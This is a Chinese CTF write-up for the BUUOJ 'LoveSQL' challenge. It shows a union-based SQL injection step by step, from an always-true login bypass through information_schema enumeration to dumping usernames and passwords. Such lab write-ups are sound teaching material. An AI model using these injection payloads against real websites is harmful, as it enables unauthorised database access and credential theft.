## [极客大挑战 2019]LoveSQL

**标签：`Union注入`**

> 链接：[[极客大挑战 2019]LoveSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL)

感觉可以把这个题作为Union注入的一个例题

**尝试 弱口令**

```
admin
1
0
```

行不通，提示错误

**尝试 万能sql**

```
1' or 1=1 #
```

<img src="../../../statics\img\CTF\1.png" style="zoom:50%;" />

哦吼，查出东西来了，说明union这条路可以继续走

这里有回显，但不代表查询的内容就这些（之前文档里提到过），所以按着文档走一遍

**查询 字段数**

```
1' or 1=1 order by 1 #
```

多试几次，发现当 `order by 4`时出现错误

![](../../../statics\img\CTF\2.png)

OK，那说明就查了3个字段，可以放心用`union`了

接下来就要看看回显的字段标号是哪几个，方便我们后面用`union`查询输出内容

```
1' union select 1, 2, 3 #
```

<img src="../../../statics\img\CTF\3.png" style="zoom:50%;" />

舒服了，2和3是回显，挺顺利，继续

**查询 表名**

```
1' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=database() #
```

<img src="../../../statics\img\CTF\4.png" style="zoom:50%;" />

查到了！后面这个表看着就很奇怪，所以我就先查了一下它`l0ve1ysq1`

**查询表中的字段**

```
1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #
```

<img src="../../../statics\img\CTF\5.png" style="zoom:50%;" />

查到了！感觉快了

**查数据**

```
1' union select 1, group_concat(username), group_concat(password) from l0ve1ysq1 # 
```

<img src="../../../statics\img\CTF\6.png" style="zoom:60%;" />

发现了什么？最后一个用户名字叫`flag`，找到了！

## 总结一下

文档中总结的步骤是很科学的，一环扣一环，每一步得到的东西都是下一步的关键信息，不知道以后还能不能这么坚持写wp，希望吧

**同类型题目**

* [[第一章 web入门]SQL注入-1](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]SQL%E6%B3%A8%E5%85%A5-1)